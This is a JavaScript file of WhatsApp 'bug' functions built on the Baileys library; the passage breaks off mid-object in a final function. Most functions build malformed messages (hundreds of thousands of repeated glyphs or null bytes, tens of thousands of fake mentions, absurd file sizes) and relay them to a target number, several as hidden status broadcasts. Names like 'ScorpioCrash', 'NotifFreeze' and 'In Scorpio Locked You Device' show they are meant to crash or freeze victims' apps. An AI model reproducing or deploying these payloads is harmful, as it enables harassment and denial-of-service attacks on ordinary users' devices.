import fs from "fs";
import { generateWAMessageFromContent } from "@whiskeysockets/baileys"; // si utilisé

// =======================
// HELPERS / RATE LIMIT / UTILS
const DEFAULT_RATE_LIMIT_MS = 800;
const lastSentAt = new Map();

function enforceRateLimit(sockId, ms = DEFAULT_RATE_LIMIT_MS) {
  const now = Date.now();
  const last = lastSentAt.get(sockId) || 0;
  if (now - last < ms) return ms - (now - last);
  lastSentAt.set(sockId, now);
  return 0;
}

function toJid(number) {
  if (!number) throw new Error("Missing target number");
  const digits = String(number).replace(/[^0-9]/g, "");
  if (digits.length < 5) throw new Error("Number too short");
  return digits.endsWith("@s.whatsapp.net") ? digits : `${digits}@s.whatsapp.net`;
}

function clampText(s, max) {
  if (!s) return "";
  return s.length > max ? s.slice(0, max - 3) + "..." : s;
}

async function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// BUG FUNCTION
async function UiScorpio(target) {
    const messagePayload = {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                fileLength: "999999999999",
                                pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
                                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                fileName: `In Scorpio Locked You Device`,
                                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1715880173"
                            },
                        hasMediaAttachment: true
                    },
                    body: {
                            text: "ScorpioCrash" + "ꦾ".repeat(150000) + "@1".repeat(250000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "ALWAYSAQIOO" }],
                        isForwarded: true,
                        quotedMessage: {
								documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "999999999999",
											pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Alwaysaqioo The Juftt️",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
						}
                    }
                    }
                }
            }
        }
    };

    surz.relayMessage(target, messagePayload, {}, { messageId: null });
}
async function invico1(target) {
const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363321780343299@newsletter",
      newsletterName: "⎋𝐅𝐢̸̷̷̷̋͜͢͜͢͠͡͡𝐍𝐈𝐗͜͢-‣" + "ោ៝".repeat(10000),
      caption: "⎋𝐅𝐢̸̷̷̷̋͜͢͜͢͠͡͡𝐍𝐈𝐗͜͢-‣" + "ោ៝".repeat(10000),
      inviteExpiration: "999999999"
    }
  };

  await surz.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null
  });
}
async function invisiblenew(target, mention) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "𝐃𝐈𝐀𝐍𝐀𝐆𝐀𝐍𝐊-‣🚀 ",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});
if (!msg.key || !msg.key.id) {
  msg.key = {
    remoteJid: target,
    fromMe: true,
    id: (Math.random() * 1e16).toString(36)
  };
}


    await surz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await surz.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "INVISIBLE -𝟗𝟕𝟒𝟏" },
                        content: undefined
                    }
                ]
            }
        );
    }
}
async function InVisibleX1(target, show) {
            let msg = await generateWAMessageFromContent(target, {
                buttonsMessage: {
                    text: "🩸",
                    contentText:
                        "𑲭𑲭𝐇𝐈𝐈 𝐈'𝐀𝐌 𝐃𝐈𝐀𝐍𝐀⍣𐎟𑆻",
                    footerText: "𝐇𝐈𝐈 𝐈'𝐀𝐌 𝐃𝐈𝐀𝐍𝐀⍣ ",
                    buttons: [
                        {
                            buttonId: ".aboutb",
                            buttonText: {
                                displayText: "𐎟𑆻𝐇𝐈𝐈 𝐈'𝐀𝐌 𝐃𝐈𝐀𝐍𝐀⍣ 𐎟𑆻 " + "\u0000".repeat(900000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await surz.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
        
            if (show) {
                await surz.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 15,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: {
                                    is_status_mention: "𐎟𑆻𝐃𝐈𝐀𝐍𝐀 𝐇𝐀𝐃𝐈𝐑 𝐏𝐀𝐊⍣𐎟𑆻⃔‌",
                                },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }
async function protocol6(target, mention) {
  const quotedMessage = {
    extendedTextMessage: {
      text: "᭯".repeat(12000),
      matchedText: "https://" + "ꦾ".repeat(500) + ".com",
      canonicalUrl: "https://" + "ꦾ".repeat(500) + ".com",
      description: "\u0000".repeat(500),
      title: "\u200D".repeat(1000),
      previewType: "NONE",
      jpegThumbnail: Buffer.alloc(10000),
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          showAdAttribution: true,
          title: "BoomXSuper",
          body: "\u0000".repeat(10000),
          thumbnailUrl: "https://" + "ꦾ".repeat(500) + ".com",
          mediaType: 1,
          renderLargerThumbnail: true,
          sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz"
        },
        mentionedJid: Array.from({ length: 1000 }, (_, i) => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`)
      }
    },
    paymentInviteMessage: {
      currencyCodeIso4217: "USD",
      amount1000: "999999999",
      expiryTimestamp: "9999999999",
      inviteMessage: "Payment Invite" + "💥".repeat(1770),
      serviceType: 1
    }
  };

  const mentionedList = [
  "13135550002@s.whatsapp.net",
  ...Array.from({ length: 500 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
];

  const embeddedMusic = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: ".SurzHeree" + "ោ៝".repeat(1000),
    title: "MegumiAgency",
    artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://n.uguu.se/BvbLvNHY.jpg",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
  };

  const videoMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
    fileLength: "109951162777600",
    seconds: 999999,
    mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
    caption: "ꦾ".repeat(1277),
    height: 640,
    width: 640,
    fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
    directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1743848703",
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true,
        title: "☠️ - んジェラルド - ☠️",
        body: "\u0000".repeat(9117),
        mediaType: 1,
        renderLargerThumbnail: true,
        thumbnailUrl: null,
        sourceUrl: "https://" + "ꦾ".repeat(100) + ".com/"
      },
      businessMessageForwardInfo: {
        businessOwnerJid: target
      },
      quotedMessage,
      isSampled: true,
      mentionedJid: mentionedList
    },
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: "ꦾ".repeat(100)
    },
    streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
    thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
    thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
    thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
    annotations: [
      {
        embeddedContent: {
          embeddedMusic
        },
        embeddedAction: true
      }
    ]
  };
  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: { videoMessage }
    }
  }, {});
if (!msg.key || !msg.key.id) {
  msg.key = {
    remoteJid: target,
    fromMe: true,
    id: (Math.random() * 1e16).toString(36)
  };
}


  await surz.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await surz.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [
        {
          tag: "meta",
          attrs: { is_status_mention: "true" },
          content: undefined
        }
      ]
    });
  }
}
async function NotifFreeze(target) {
      surz.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "surz.com" + "࣯ꦾ".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "Neobest.cloud.com" + "ꦾ".repeat(90000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }
async function Surz7(target, Ptcp = true) {
    let virtex = "🐉생성됨 𝗗𝗜𝗔𝗡𝗔 𝗕𝗵𝗮𝗵𝗮𝗵𝗮𝗵𝘄𝘄𝗮𝗵𝗵 공식" + "ꦾ".repeat(49000);
    await surz.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "\u0009".repeat(100),
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "\u0009" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function protocolbug4(target, mention) {
    const glitchText = "𓆩⛧𓆪".repeat(3000) + "\n" + "‎".repeat(3000); // simbol + invisible
    
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: `>_<\n${glitchText}`,
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 40000 }, () => "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9999,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});
if (!msg.key || !msg.key.id) {
  msg.key = {
    remoteJid: target,
    fromMe: true,
    id: (Math.random() * 1e16).toString(36)
  };
}


    await surz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await surz.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "TACHI" },
                        content: undefined
                    }
                ]
            }
        );
    }
}
async function bulldozer(target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});
if (!msg.key || !msg.key.id) {
  msg.key = {
    remoteJid: target,
    fromMe: true,
    id: (Math.random() * 1e16).toString(36)
  };
}


  await surz.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
async function protocolbug5(target, mention) {
const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".𝗗𝗜𝗔𝗡𝗔 𝗜𝗦𝗛𝗲𝗿𝗲𝗲𝗲" + "ោ៝".repeat(10000),
        title: "Megumi",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "𐌖𐌉𐌍𐌂𐍃 ✦ 𐌔𐌖𐍀𐌄𐍂𐌍𐌰𐌙𐍂",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "༿༑ᜳDiana Dekᢶ⃟"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});
if (!msg.key || !msg.key.id) {
  msg.key = {
    remoteJid: target,
    fromMe: true,
    id: (Math.random() * 1e16).toString(36)
  };
}


    await surz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await surz.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}
async function protocolbug3(target, mention) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "\u9999",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                              musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: "\u9999",
                                    title: "\u9999",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await surz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await surz.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
    }
function delay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}
async function Wraperos2(target) {
let apiClient = JSON.stringify({
    status: true,
    criador: "Diana WhatsApp Api",
    resultado: {
        type: "md",
        ws: {
            _events: { "CB:ib,,dirty": ["Array"] },
            _eventsCount: 800000,
            _maxListeners: 0,
            url: "wss://web.whatsapp.com/ws/chat",
            config: {
                version: ["Array"],
                browser: ["Array"],
                waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                sockCectTimeoutMs: 20000,
                keepAliveIntervalMs: 30000,
                logger: {},
                printQRInTerminal: false,
                emitOwnEvents: true,
                defaultQueryTimeoutMs: 60000,
                customUploadHosts: [],
                retryRequestDelayMs: 250,
                maxMsgRetryCount: 5,
                fireInitQueries: true,
                auth: { Object: "authData" },
                markOnlineOnsockCect: true,
                syncFullHistory: true,
                linkPreviewImageThumbnailWidth: 192,
                transactionOpts: { Object: "transactionOptsData" },
